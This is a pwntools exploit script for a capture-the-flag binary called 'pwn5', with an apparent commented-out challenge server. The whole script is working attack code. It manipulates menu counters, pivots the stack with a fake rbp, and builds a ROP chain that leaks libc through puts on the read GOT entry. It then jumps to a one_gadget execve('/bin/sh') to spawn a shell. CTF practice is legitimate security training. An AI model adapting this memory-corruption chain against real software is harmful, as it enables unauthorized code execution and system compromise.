from pwn import *

#r = remote("ctf.kuality.kr",12354)
r = process(['./pwn5'],env={'LD_PRELOAD':'./libc.so.6'})
#context.log_level = 'debug'


gdb.attach(r,'b* 0x0000000000400b2f')
r.sendlineafter(">> ","1")
r.sendlineafter(">> ", 'Gogi mandu')

# payment change ordernum 1 -> 16
r.sendlineafter(">> ","2")
r.sendlineafter(">> ", "32")
r.sendlineafter(">> ", '17')

# payment change commentnum
r.sendlineafter(">> ","2")
r.sendlineafter(">> ", "33")
r.sendlineafter(">> ", "1001")


'''
0x0000000000400829 : leave ; ret
0x0000000000400df3 : pop rdi ; ret

pwndbg> x/x 0x602030   <read.got.plt>
0x602030:	0x00007ffff7b04250

0x00000000400646    <puts plt>

0x00000000400abe    <main+0>
'''




fakerbp = 0x6060c0

# leave a comment
r.sendlineafter(">> ","3")
payload1 = p64(fakerbp)
payload1 += p64(0x00400df3) # pop rdi; ret;
payload1 += p64(0x00602030) # read got
payload1 += p64(0x00400646) # puts plt
payload1 += p64(0x00400abe) # return main;
r.sendlineafter(">> ",payload1)

# order allocate rbp + ret
r.sendlineafter(">> ","1")
payload2 = p64(fakerbp)
payload2 += p64(0x00400829)
r.sendlineafter(">> ",payload2) 


r.sendlineafter(">> ","4")
r.recvuntil("bye! bye~!\n")
leak = u64(r.recvline()[:-1].ljust(8,'\x00'))
libc_base = leak - 1012304
success("libc_base = "+hex(libc_base))

one_gadget = libc_base + 0x45216
'''
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
payload3 = 'A'*8
payload3 += p64(one_gadget)
r.sendlineafter(">> ",'1')
r.sendlineafter(">> ",payload3)

r.sendlineafter(">> ","4")

r.interactive()
